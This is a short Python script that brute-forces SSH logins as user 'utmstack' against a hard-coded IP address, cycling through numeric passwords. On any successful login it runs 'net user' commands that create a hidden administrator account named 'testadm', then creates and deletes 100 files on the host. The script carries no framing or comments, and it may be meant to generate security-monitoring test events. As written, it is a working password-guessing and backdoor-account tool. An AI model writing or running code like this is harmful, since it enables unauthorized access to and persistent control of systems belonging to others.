
import paramiko
import random

def ssh_connect(username, password, hostname):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, username=username, password=password)
        print(f"Successful login with username '{username}' and password '{password}'")
        command = f"net user testadm rock1234 /add && net localgroup administrators testadm /add"
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()
        if error:
            print(f"Error creating user account: {error}")
        else:
            print(f"User account created successfully: {output}")
        
        # Create 100 files
        for i in range(1, 101):
            command = f"type nul > file{i}.txt"
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            if error:
                print(f"Error creating file: {error}")
            else:
                print(f"File created successfully: {output}")
        
        # Remove the 100 files
        for i in range(1, 101):
            command = f"del file{i}.txt"
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode()
            error = stderr.read().decode()
            if error:
                print(f"Error removing file: {error}")
            else:
                print(f"File removed successfully: {output}")
        
        ssh.close()
        return True
    except:
        print(f"Failed login with username '{username}' and password '{password}'")
        return False

for i in range(113, 124):
    ssh_connect(username="utmstack", password=str(i), hostname="20.51.213.97")

